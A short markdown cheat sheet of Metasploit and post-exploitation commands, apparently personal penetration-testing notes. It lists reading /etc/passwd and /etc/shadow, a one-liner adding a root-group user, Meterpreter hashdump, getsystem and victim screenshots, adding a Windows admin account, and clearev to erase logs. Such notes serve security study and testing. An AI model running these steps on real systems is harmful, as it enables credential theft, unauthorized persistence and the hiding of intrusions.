# Metasploit Commands
`msfconsole`
## Use a Module. Tab to see all
`use <path-to-module>`

`info`: of module, RHOSTS, RPORT,etc
`help`

`search <keyword>`

`set RHOSTS <target-ip>`
### set RHOST GLOBALY
`setg RHOST <target-ip>`
`run`

### Show hosts saved
`hosts`
### Show services to exploit
`services`
### Import nmap results
`db_import <path-to-results>`
### Run commands of nmap in Metasploit
`db_nmap <ip> --top-ports 1000 -T5 -n -Pn -sV`
`services`


## Command shell session 1 opened (ip...)
### Checking
`id` --> uid=0(root) gid=0(root)
`pwd`
`ls`
`ifconfig
#password
cat /etc/passwd
#password hashes
cat /etc/shadow

#Put session to Background
Ctrl+Z
### Get sessions
sessions
### Get back to a specific session
sessions -i <session-id>

### Create user with sudo (Oneliner)
useradd -u <id> -g root -d /home/<user-name> -s /bin/bash -p $(echo <user-passwd> | openssl passwd -1 -stdin) <user-name>

### Search ID of exploit in exploit-db.com
search edb:<id>

show payloads

## Attacking Windows
### Gets a shell on meterpreter
help
hashdump
getuid
### Get elevated privileges
getsystem
### Screenshot the victim
screenshot
shell
    net view
    #Add user with admin privileges
    net user <user-name> <user-paswd> /ADD
    net localhroup administrators <user-name> /ADD

### Clear evidence from remote system
    exit
### Clears records
clearev

